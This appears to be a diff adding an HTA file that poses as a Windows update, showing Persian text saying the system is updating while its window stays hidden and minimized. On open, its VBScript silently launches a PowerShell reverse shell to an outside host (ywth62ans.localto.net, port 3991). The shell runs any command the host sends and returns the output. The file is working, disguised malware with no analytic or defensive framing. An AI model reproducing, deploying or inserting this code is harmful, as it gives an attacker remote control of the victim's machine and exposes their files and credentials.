@@ -1,0 +1,14 @@
+<html>
+<head>
+    <title>در حال به‌روزرسانی...</title>
+    <HTA:APPLICATION BORDER="thin" CAPTION="no" SHOWINTASKBAR="no" SYSMENU="no" WINDOWSTATE="minimize"/>
+</head>
+<script language="VBScript">
+    ip = "ywth62ans.localto.net"
+    port = "3991"
+    cmd = "powershell.exe -nop -win hidden -c $client = New-Object System.Net.Sockets.TCPClient('" & ip & "'," & port & ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    CreateObject("WScript.Shell").Run cmd, 0, False
+    window.close()
+</script>
+<body><b>در حال به‌روزرسانی ویندوز... لطفاً صبر کنید</b></body>
+</html>
